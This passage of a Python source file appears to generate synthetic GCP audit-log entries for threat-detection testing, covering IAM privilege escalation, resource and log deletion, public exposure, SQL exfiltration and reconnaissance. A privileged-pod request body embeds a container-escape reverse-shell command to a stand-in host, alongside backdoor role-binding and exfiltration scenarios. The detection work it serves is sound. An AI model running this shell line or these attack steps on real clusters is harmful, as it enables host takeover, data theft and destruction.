                    {"action": "ADD", "role": role, "member": member},
                ],
            },
        },
    )
    return [entry]


def _gen_deploymentmanager_self_grant(config, context=None):
    """
    THREAT: A cloud identity grants itself a sensitive Deployment Manager IAM role.
    Self-grant pattern: principalEmail == member — the caller and grantee are the same identity.
    Triggers XSIAM: 'A cloud identity granted itself a sensitive Deployment Manager IAM role'.
    Privilege Escalation — DM service accounts often hold broad project permissions,
    so a DM editor role is an indirect path to full project compromise.
    service: cloudresourcemanager.googleapis.com  method: SetIamPolicy
    resource_type: project  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    email = p['email']
    # Self-grant: caller adds themselves as the grantee
    member_prefix = "serviceAccount" if p['is_service_account'] else "user"
    member = f"{member_prefix}:{email}"
    role = random.choice([
        "roles/deploymentmanager.editor",     # create/update/delete deployments
        "roles/deploymentmanager.typeViewer", # view type info (initial recon)
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = email,
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "SetIamPolicy",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}",
                "permission": "resourcemanager.projects.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "resource": f"projects/{project_id}",
            "policy": {
                "bindings": [{"role": role, "members": [member]}],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
                    {"action": "ADD", "role": role, "member": member},
                ],
            },
        },
    )
    return [entry]


def _gen_vpc_network_delete(config, context=None):
    """
    THREAT: Delete a VPC network — destroys all subnets, firewall rules, and peering
    attached to the network. Causes full network-level disruption for all resources in
    that VPC.
    Triggers XSIAM: 'A GCP VPC network was deleted.'
    service: compute.googleapis.com  method: v1.compute.networks.delete
    resource_type: gce_network  labels: network_id (numeric)  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    network    = _get_random_vpc_network(config)
    network_id = str(random.randint(100000000000000000, 999999999999999999))
    resource_name = f"projects/{project_id}/global/networks/{network}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.networks.delete",
        resource_name   = resource_name,
        resource_type   = "gce_network",
        resource_labels = {"network_id": network_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "compute.networks.delete",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {"project": project_id, "network": network},
    )
    return [entry]


def _gen_vpc_route_delete(config, context=None):
    """
    THREAT: Delete a VPC route — disrupts traffic routing for workloads depending on
    the route (e.g. removing the default internet gateway route cuts outbound internet
    access for all VMs in the VPC).
    Triggers XSIAM: 'A GCP VPC route was deleted.'
    service: compute.googleapis.com  method: v1.compute.routes.delete
    resource_type: gce_route  labels: route_id (numeric)  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    # Target production or default routes — named routes or synthetic names
    route_name = random.choice([
        "default-route-internet",
        "default-route-local",
        f"prod-route-{uuid.uuid4().hex[:8]}",
        f"gke-route-{uuid.uuid4().hex[:8]}",
    ])
    route_id   = str(random.randint(100000000000000000, 999999999999999999))
    resource_name = f"projects/{project_id}/global/routes/{route_name}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.routes.delete",
        resource_name   = resource_name,
        resource_type   = "gce_route",
        resource_labels = {"route_id": route_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "compute.routes.delete",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {"project": project_id, "route": route_name},
    )
    return [entry]


def _gen_iam_role_create(config, context=None):
    """
    THREAT: Create a custom IAM role with broad or unusual permissions — shadow admin
    role staging. Attacker creates a custom role to grant themselves elevated access
    in a way that bypasses standard role naming monitoring.
    Triggers XSIAM: 'A GCP IAM role was created.'
    service: iam.googleapis.com  method: google.iam.admin.v1.CreateRole
    resource_type: project  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    role_id    = f"customRole{uuid.uuid4().hex[:8]}"
    role_title = random.choice([
        "DevOps Support Role",
        "Monitoring Viewer",
        "Infra Automation SA",
        "Shadow Admin",
        "Security Auditor Helper",
    ])

    # Attacker includes broad permissions mixed with innocuous-sounding ones
    suspicious_perms = random.choice([
        [
            "iam.serviceAccounts.actAs",
            "iam.serviceAccountKeys.create",
            "resourcemanager.projects.setIamPolicy",
        ],
        [
            "compute.instances.setMetadata",
            "iam.roles.create",
            "storage.buckets.setIamPolicy",
        ],
        [
            "secretmanager.versions.access",
            "iam.serviceAccounts.getAccessToken",
            "logging.sinks.delete",
        ],
    ])

    resource_name = f"projects/{project_id}"
    new_role_name = f"projects/{project_id}/roles/{role_id}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.admin.v1.CreateRole",
        resource_name   = resource_name,
        resource_type   = "project",
        resource_labels = {"project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "iam.roles.create",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "parent": resource_name,
            "roleId": role_id,
            "role": {
                "title":                role_title,
                "description":          "Custom role for operational access",
                "includedPermissions":  suspicious_perms,
                "stage":                "GA",
            },
        },
        response_body = {
            "name":                 new_role_name,
            "title":                role_title,
            "includedPermissions":  suspicious_perms,
            "etag":                 uuid.uuid4().hex[:24],
            "stage":                "GA",
        },
    )
    return [entry]


def _gen_disable_service_account(config, context=None):
    """
    THREAT: Disable a GCP service account. Attacker disables a legitimate SA to
    disrupt automated workloads that depend on it, or to prevent incident responders
    from using the SA for recovery operations.
    Triggers XSIAM: 'A GCP service account was disabled.'
    service: iam.googleapis.com  method: google.iam.admin.v1.DisableServiceAccount
    resource_type: service_account  labels: email_id, unique_id  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    sa_email   = _get_random_sa_excluding(config, p['email'])
    unique_id  = str(random.randint(100000000000, 999999999999))
    resource_name = f"projects/{project_id}/serviceAccounts/{sa_email}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.admin.v1.DisableServiceAccount",
        resource_name   = resource_name,
        resource_type   = "service_account",
        resource_labels = {"email_id": sa_email, "unique_id": unique_id, "project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "iam.serviceAccounts.disable",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {"name": resource_name},
    )
    return [entry]


def _gen_logging_bucket_delete(config, context=None):
    """
    THREAT: Delete a Cloud Logging storage bucket (_Default, _Required, or custom).
    A log bucket is the storage backend where Cloud Logging retains log data — distinct
    from a log sink (export pipeline). Deleting it destroys retained log data and
    prevents future ingestion until re-created.
    Triggers XSIAM: 'A GCP logging bucket was deleted.'
    service: logging.googleapis.com  method: ConfigServiceV2.DeleteBucket
    resource_type: logging_bucket  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    # Mix of built-in buckets (high impact) and custom buckets
    bucket_id = random.choice([
        "_Default", "_Default", "_Required",    # weighted toward high-impact built-ins
        "audit-logs", "security-logs", "compliance-archive", "siem-export",
    ])
    resource_name = f"projects/{project_id}/locations/{region}/buckets/{bucket_id}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "logging.googleapis.com",
        method_name     = "google.logging.v2.ConfigServiceV2.DeleteBucket",
        resource_name   = resource_name,
        resource_type   = "logging_bucket",
        resource_labels = {"project_id": project_id, "bucket_id": bucket_id, "location": region},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "logging.buckets.delete",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {"name": resource_name},
    )
    return [entry]


def _gen_delete_service_account(config, context=None):
    """
    THREAT: Delete a GCP service account. An attacker deletes a valid service account
    to disrupt workloads, remove forensic evidence, or deny access to incident responders.
    Triggers XSIAM: 'A GCP service account was deleted.'
    service: iam.googleapis.com  method: DeleteServiceAccount
    resource_type: service_account  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    # The SA being deleted — must differ from the actor
    sa_email    = _get_random_sa_excluding(config, p['email'])
    unique_id   = str(random.randint(100000000000, 999999999999))
    resource_name = f"projects/{project_id}/serviceAccounts/{sa_email}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.admin.v1.DeleteServiceAccount",
        resource_name   = resource_name,
        resource_type   = "service_account",
        resource_labels = {"email_id": sa_email, "unique_id": unique_id, "project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "iam.serviceAccounts.delete",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {"name": resource_name},
    )
    return [entry]


def _gen_gcs_bucket_config_modify(config, context=None):
    """
    THREAT: Modify a GCS bucket's configuration — removes security controls.
    Common attacker actions: disable uniform bucket-level access (to allow per-object ACLs),
    remove public access prevention, change retention policy, or disable versioning.
    Triggers XSIAM: 'A GCP storage bucket configuration has been modified.'
    service: storage.googleapis.com  method: storage.buckets.patch
    resource_type: gcs_bucket  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    bucket     = _get_random_gcs_bucket(config)
    region     = _random_region(config)

    # Pick the type of configuration change — each weakens a different security control
    change_type = random.choice([
        "disable_uniform_access",
        "remove_public_access_prevention",
        "disable_versioning",
        "remove_retention_policy",
        "change_default_acl",
    ])

    if change_type == "disable_uniform_access":
        patch_body = {
            "iamConfiguration": {
                "uniformBucketLevelAccess": {"enabled": False},
            },
        }
    elif change_type == "remove_public_access_prevention":
        patch_body = {
            "iamConfiguration": {
                "publicAccessPrevention": "inherited",  # was "enforced"
            },
        }
    elif change_type == "disable_versioning":
        patch_body = {"versioning": {"enabled": False}}
    elif change_type == "remove_retention_policy":
        patch_body = {"retentionPolicy": None}
    else:  # change_default_acl
        patch_body = {
            "defaultObjectAcl": [
                {"entity": "allAuthenticatedUsers", "role": "READER"},
            ],
        }

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "storage.googleapis.com",
        method_name     = "storage.buckets.patch",
        resource_name   = f"projects/_/buckets/{bucket}",
        resource_type   = "gcs_bucket",
        resource_labels = {"bucket_name": bucket, "location": region, "project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/_/buckets/{bucket}",
            "permission": "storage.buckets.update",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {"bucket": bucket, **patch_body},
    )
    return [entry]


def _gen_gcs_bucket_delete(config, context=None):
    """
    THREAT: Delete a GCS bucket. Destroys all objects and the bucket itself —
    data loss / disruption of workflows that depend on the bucket.
    Triggers XSIAM: 'A GCP bucket was deleted.'
    service: storage.googleapis.com  method: storage.buckets.delete
    resource_type: gcs_bucket  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    bucket     = _get_random_gcs_bucket(config)
    region     = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "storage.googleapis.com",
        method_name     = "storage.buckets.delete",
        resource_name   = f"projects/_/buckets/{bucket}",
        resource_type   = "gcs_bucket",
        resource_labels = {"bucket_name": bucket, "location": region, "project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/_/buckets/{bucket}",
            "permission": "storage.buckets.delete",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {"bucket": bucket},
    )
    return [entry]


# ---------------------------------------------------------------------------
# New threat generators — GKE, Cloud Run, Cloud SQL, BigQuery, Artifact
# Registry, IAM recon, KMS, Cloud Build, GCS lifecycle
# ---------------------------------------------------------------------------

def _gen_gke_privileged_pod_created(config, context=None):
    """
    THREAT: Create a Kubernetes Pod with privileged: true security context — container
    escape / host takeover.  The pod mounts the host filesystem and requests
    SYS_ADMIN+SYS_PTRACE, allowing nsenter-based breakout into the GKE node OS.
    service: k8s.io  method: io.k8s.core.v1.pods.create
    resource_type: k8s_cluster  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    cluster    = _get_random_gke_cluster(config)
    namespace  = random.choice(["default", "kube-system", "production", "monitoring"])
    pod_name   = f"priv-pod-{uuid.uuid4().hex[:8]}"
    image      = random.choice([
        "alpine:3.18",
        "ubuntu:22.04",
        "gcr.io/google-containers/busybox:latest",
        "us-docker.pkg.dev/attacker-tools/images/toolkit:latest",
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "k8s.io",
        method_name     = "io.k8s.core.v1.pods.create",
        resource_name   = f"core/v1/namespaces/{namespace}/pods/{pod_name}",
        resource_type   = "k8s_cluster",
        resource_labels = {"location": region, "cluster_name": cluster},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/{project_id}/locations/{region}/clusters/{cluster}",
            "permission": "container.pods.create",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "apiVersion": "v1",
            "kind":       "Pod",
            "metadata": {
                "name":        pod_name,
                "namespace":   namespace,
                "labels":      {"app": "debug", "tier": "ops"},
                "annotations": {"kubectl.kubernetes.io/last-applied-configuration": "{}"},
            },
            "spec": {
                "hostPID":     True,
                "hostNetwork": True,
                "containers": [{
                    "name":    "pwn",
                    "image":   image,
                    "command": [
                        "/bin/sh", "-c",
                        "nsenter -t 1 -m -u -i -n -- bash -i "
                        "&>/dev/tcp/10.0.0.1/4444 <&1",
                    ],
                    "securityContext": {
                        "privileged":               True,
                        "allowPrivilegeEscalation": True,
                        "capabilities": {
                            "add": ["SYS_ADMIN", "SYS_PTRACE", "NET_ADMIN", "DAC_OVERRIDE"],
                        },
                        "runAsUser": 0,
                    },
                    "volumeMounts": [{"name": "host-root", "mountPath": "/host"}],
                }],
                "volumes": [{"name": "host-root", "hostPath": {"path": "/"}}],
                "restartPolicy": "Never",
            },
        },
    )
    return [entry]


def _gen_gke_cluster_admin_binding(config, context=None):
    """
    THREAT: Create a Kubernetes ClusterRoleBinding granting cluster-admin to an
    external user, service account, or group — full cluster compromise with
    unrestricted API server access.
    service: k8s.io  method: io.k8s.rbac.v1.clusterrolebindings.create
    resource_type: k8s_cluster  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    cluster    = _get_random_gke_cluster(config)
    binding_name = f"backdoor-admin-{uuid.uuid4().hex[:6]}"

    # Pick a subject type — each represents a different attacker foothold
    subj_choice = random.choice(["user", "serviceaccount", "group"])
    if subj_choice == "user":
        subject = {
            "kind":     "User",
            "name":     random.choice(_EXTERNAL_GMAIL_ACCOUNTS),
            "apiGroup": "rbac.authorization.k8s.io",
        }
    elif subj_choice == "serviceaccount":
        subject = {
            "kind":      "ServiceAccount",
            "name":      random.choice(["malicious-sa", "debug-sa", "monitor-sa"]),
            "namespace": random.choice(["default", "kube-system"]),
        }
    else:
        domain  = _get_corp_domain(config)
        subject = {
            "kind":     "Group",
            "name":     random.choice([
                f"contractors@{domain}",
                f"external-devs@{domain}",
                "system:unauthenticated",
            ]),
            "apiGroup": "rbac.authorization.k8s.io",
        }

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "k8s.io",
        method_name     = "io.k8s.rbac.v1.clusterrolebindings.create",
        resource_name   = f"rbac.authorization.k8s.io/v1/clusterrolebindings/{binding_name}",
        resource_type   = "k8s_cluster",
        resource_labels = {"location": region, "cluster_name": cluster},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/{project_id}/locations/{region}/clusters/{cluster}",
            "permission": "container.clusterRoleBindings.create",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "apiVersion": "rbac.authorization.k8s.io/v1",
            "kind":       "ClusterRoleBinding",
            "metadata": {
                "name":   binding_name,
                "labels": {"managed-by": "kubectl"},
            },
            "roleRef": {
                "apiGroup": "rbac.authorization.k8s.io",
                "kind":     "ClusterRole",
                "name":     "cluster-admin",
            },
            "subjects": [subject],
        },
    )
    return [entry]


def _gen_gke_public_endpoint_enabled(config, context=None):
    """
    THREAT: Modify a private GKE cluster to add 0.0.0.0/0 to master authorised
    networks — exposes the Kubernetes API server to the public internet.
    service: container.googleapis.com
    method: google.container.v1.ClusterManager.UpdateCluster
    resource_type: gke_cluster  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    cluster    = _get_random_gke_cluster(config)
    op_id      = f"operation-{uuid.uuid4().hex[:16]}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "container.googleapis.com",
        method_name     = "google.container.v1.ClusterManager.UpdateCluster",
        resource_name   = f"projects/{project_id}/locations/{region}/clusters/{cluster}",
        resource_type   = "gke_cluster",
        resource_labels = {"location": region, "cluster_name": cluster},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/{project_id}/locations/{region}/clusters/{cluster}",
            "permission": "container.clusters.update",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "name": f"projects/{project_id}/locations/{region}/clusters/{cluster}",
            "update": {
                "desiredMasterAuthorizedNetworksConfig": {
                    "enabled": True,
                    "cidrBlocks": [
                        {"displayName": "allow-all", "cidrBlock": "0.0.0.0/0"},
                    ],
                },
            },
        },
        response_body = {
            "name":          op_id,
            "operationType": "UPDATE_CLUSTER",
            "status":        "RUNNING",
            "selfLink":
                f"https://container.googleapis.com/v1/projects/{project_id}"
                f"/locations/{region}/operations/{op_id}",
            "targetLink":
                f"https://container.googleapis.com/v1/projects/{project_id}"
                f"/locations/{region}/clusters/{cluster}",
            "startTime": _gcp_timestamp(),
        },
    )
    return [entry]


def _gen_cloudrun_public_deploy(config, context=None):
    """
    THREAT: Grant allUsers roles/run.invoker on a Cloud Run service — makes the
    service publicly invocable without any authentication, bypassing IAP and any
    service-level auth controls.
    service: run.googleapis.com  method: google.iam.v1.IAMPolicy.SetIamPolicy
    resource_type: cloud_run_revision  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    service    = _get_random_cloud_run_service(config)

    resource_name = f"projects/{project_id}/locations/{region}/services/{service}"
    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "run.googleapis.com",
        method_name     = "google.iam.v1.IAMPolicy.SetIamPolicy",
        resource_name   = resource_name,
        resource_type   = "cloud_run_revision",
        resource_labels = {"service_name": service, "location": region},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "run.services.setIamPolicy",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "resource": resource_name,
            "policy": {
                "bindings": [
                    {
                        "role":    "roles/run.invoker",
                        "members": ["allUsers"],
                    },
                    {
                        "role":    "roles/run.developer",
                        "members": [f"serviceAccount:{_get_random_sa(config)}"],
                    },
                ],
                "etag":    uuid.uuid4().hex[:20],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [{
                    "action": "ADD",
                    "role":   "roles/run.invoker",
                    "member": "allUsers",
                }],
            },
        },
    )
    return [entry]


def _gen_cloudsql_export_external(config, context=None):
    """
    THREAT: Export a Cloud SQL database to an attacker-controlled GCS bucket in a
    different project — SQL-layer data exfiltration bypassing object-level logging.
    service: sqladmin.googleapis.com
    method: google.cloud.sql.v1.SqlInstancesService.Export
    resource_type: cloudsql_database  log_type: ACTIVITY
    """
    p               = _get_random_principal(config, context)
    project_id      = _get_project_id(config)
    region          = _random_region(config)
    instance        = _get_random_sql_instance(config)
    db_name         = random.choice(["customers", "transactions", "users", "inventory", "prod"])
    attacker_bucket = f"exfil-staging-{random.randint(10000, 99999)}"
    export_fname    = f"{db_name}-{uuid.uuid4().hex[:8]}.sql.gz"
    export_uri      = f"gs://{attacker_bucket}/dumps/{export_fname}"
    op_name         = uuid.uuid4().hex

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "sqladmin.googleapis.com",
        method_name     = "google.cloud.sql.v1.SqlInstancesService.Export",
        resource_name   = f"projects/{project_id}/instances/{instance}",
        resource_type   = "cloudsql_database",
        resource_labels = {"database_id": f"{project_id}:{instance}", "region": region},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/{project_id}/instances/{instance}",
            "permission": "cloudsql.instances.export",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "project":  project_id,
            "instance": instance,
            "body": {
                "exportContext": {
                    "kind":      "sql#exportContext",
                    "fileType":  "SQL",
                    "uri":       export_uri,
                    "databases": [db_name],
                    "sqlExportOptions": {
                        "schemaOnly": False,
                        "tables":     [],
                        "mysqlExportOptions": {"masterData": 0},
                    },
                },
            },
        },
        response_body = {
            "kind":          "sql#operation",
            "name":          op_name,
            "operationType": "EXPORT",
            "status":        "RUNNING",
            "targetId":      instance,
            "targetProject": project_id,
            "exportContext": {"uri": export_uri, "fileType": "SQL"},
        },
    )
    return [entry]


def _gen_cloudsql_backup_delete(config, context=None):
    """
    THREAT: Mass deletion of Cloud SQL automated backups — eliminates recovery
    options as a precursor to ransomware or sabotage.
    Generates 3-8 individual SqlBackupRunsService.Delete events from same identity.
    service: sqladmin.googleapis.com
    method: google.cloud.sql.v1.SqlBackupRunsService.Delete
    resource_type: cloudsql_database  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    instance   = _get_random_sql_instance(config)
    count      = random.randint(3, 8)
    entries    = []

    for i in range(count):
        backup_id = str(random.randint(1000000000, 9999999999))
        entry = _build_log_entry(
            project_id      = project_id,
            principal_email = p['email'],
            caller_ip       = p['caller_ip'],
            service_name    = "sqladmin.googleapis.com",
            method_name     = "google.cloud.sql.v1.SqlBackupRunsService.Delete",
            resource_name   = f"projects/{project_id}/instances/{instance}/backupRuns/{backup_id}",
            resource_type   = "cloudsql_database",
            resource_labels = {"database_id": f"{project_id}:{instance}", "region": region},
            log_type        = _LOG_ACTIVITY,
            offset_seconds  = -(count - i) * 12,
            authorization_info = [{
                "resource":   f"projects/{project_id}/instances/{instance}",
                "permission": "cloudsql.backupRuns.delete",
                "granted":    True,
                "resourceAttributes": {},
            }],
            request_body = {
                "project":  project_id,
                "instance": instance,
                "id":       backup_id,
            },
        )
        entries.append(entry)
    return entries


def _gen_bigquery_table_delete(config, context=None):
    """
    THREAT: Mass deletion of BigQuery tables across a dataset — data destruction /
    ransomware pattern targeting analytics infrastructure.
    Generates 3-8 TableService.DeleteTable events in rapid succession.
    service: bigquery.googleapis.com
    method: google.cloud.bigquery.v2.TableService.DeleteTable
    resource_type: bigquery_dataset  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    dataset    = _get_random_bq_dataset(config)
    tables     = random.sample(
        ["users", "transactions", "sessions", "events", "revenue",
         "customer_pii", "orders", "inventory", "audit_log", "ml_features"],
        k=random.randint(3, 8),
    )
    entries    = []

    for i, table in enumerate(tables):
        entry = _build_log_entry(
            project_id      = project_id,
            principal_email = p['email'],
            caller_ip       = p['caller_ip'],
            service_name    = "bigquery.googleapis.com",
            method_name     = "google.cloud.bigquery.v2.TableService.DeleteTable",
            resource_name   = f"projects/{project_id}/datasets/{dataset}/tables/{table}",
            resource_type   = "bigquery_dataset",
            resource_labels = {"project_id": project_id, "dataset_id": dataset},
            log_type        = _LOG_ACTIVITY,
            offset_seconds  = -(len(tables) - i) * 4,
            authorization_info = [{
                "resource":   f"projects/{project_id}/datasets/{dataset}/tables/{table}",
                "permission": "bigquery.tables.delete",
                "granted":    True,
                "resourceAttributes": {},
            }],
            request_body = {
                "projectId": project_id,
                "datasetId": dataset,
                "tableId":   table,
            },
        )
        entries.append(entry)
    return entries


def _gen_bigquery_public_dataset(config, context=None):
    """
    THREAT: Modify a BigQuery dataset's access list to grant allAuthenticatedUsers
    READER — exposes potentially sensitive analytics tables to any Google account.
    service: bigquery.googleapis.com
    method: google.cloud.bigquery.v2.DatasetService.Update
    resource_type: bigquery_dataset  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    dataset    = _get_random_bq_dataset(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "bigquery.googleapis.com",
        method_name     = "google.cloud.bigquery.v2.DatasetService.Update",
        resource_name   = f"projects/{project_id}/datasets/{dataset}",
        resource_type   = "bigquery_dataset",
        resource_labels = {"project_id": project_id, "dataset_id": dataset},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/{project_id}/datasets/{dataset}",
            "permission": "bigquery.datasets.update",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "projectId": project_id,
            "datasetId": dataset,
            "resource": {
                "datasetReference": {"projectId": project_id, "datasetId": dataset},
                "location":         region,
                "access": [
                    {"role": "OWNER",  "specialGroup": "projectOwners"},
                    {"role": "WRITER", "specialGroup": "projectWriters"},
                    {"role": "READER", "specialGroup": "projectReaders"},
                    {"role": "READER", "specialGroup": "allAuthenticatedUsers"},
                ],
            },
            "fields": "access",
        },
    )
    return [entry]


def _gen_artifact_registry_public(config, context=None):
    """
    THREAT: Set an Artifact Registry repository IAM policy to grant allUsers
    roles/artifactregistry.reader — exposes container images to the public internet,
    enabling attacker reconnaissance and potential supply-chain pivot.
    service: artifactregistry.googleapis.com
    method: google.devtools.artifactregistry.v1.ArtifactRegistry.SetIamPolicy
    resource_type: audited_resource  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)

    gcp_conf = config.get(CONFIG_KEY, {})
    repos    = gcp_conf.get('artifact_registry_repos', [])
    repo     = random.choice(repos) if repos else random.choice(
        ["app-images", "base-images", "internal-tools", "ml-models", "microservices"]
    )

    resource_name = f"projects/{project_id}/locations/{region}/repositories/{repo}"
    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "artifactregistry.googleapis.com",
        method_name     = "google.devtools.artifactregistry.v1.ArtifactRegistry.SetIamPolicy",
        resource_name   = resource_name,
        resource_type   = "audited_resource",
        resource_labels = {"service": "artifactregistry.googleapis.com", "project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "artifactregistry.repositories.setIamPolicy",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "resource": resource_name,
            "policy": {
                "bindings": [
                    {
                        "role":    "roles/artifactregistry.reader",
                        "members": ["allUsers"],
                    },
                    {
                        "role":    "roles/artifactregistry.writer",
                        "members": [f"serviceAccount:{_get_random_sa(config)}"],
                    },
                ],
                "etag":    uuid.uuid4().hex[:20],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [{
                    "action": "ADD",
                    "role":   "roles/artifactregistry.reader",
                    "member": "allUsers",
                }],
            },
        },
    )
    return [entry]


def _gen_iam_recon_testpermissions(config, context=None):
    """
    THREAT: Burst of TestIamPermissions calls across multiple GCP services —
    post-compromise privilege mapping.  The attacker probes what the compromised
    credential can do on IAM, storage, BigQuery, Secrets, and Compute before
    choosing the next pivot step.
    Generates 5-15 DATA_ACCESS events targeting different resource types.
    log_type: DATA_ACCESS  (TestIamPermissions is a read-only metadata operation)
    """
    principal  = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    bucket     = _get_random_gcs_bucket(config)
    dataset    = _get_random_bq_dataset(config)
    secret_res = _get_random_secret_id(config, sensitive=True)
    count      = random.randint(5, 15)

    # Each entry describes a service + resource + permission set to probe
    recon_pool = [
        {
            "service":    "cloudresourcemanager.googleapis.com",
            "res_name":   f"projects/{project_id}",
            "res_type":   "project",
            "res_labels": {"project_id": project_id},
            "perms": [
                "resourcemanager.projects.setIamPolicy",
                "resourcemanager.projects.delete",
                "resourcemanager.projects.get",
                "billing.accounts.get",
            ],
        },
        {
            "service":    "iam.googleapis.com",
            "res_name":   f"projects/{project_id}",
            "res_type":   "project",
            "res_labels": {"project_id": project_id},
            "perms": [
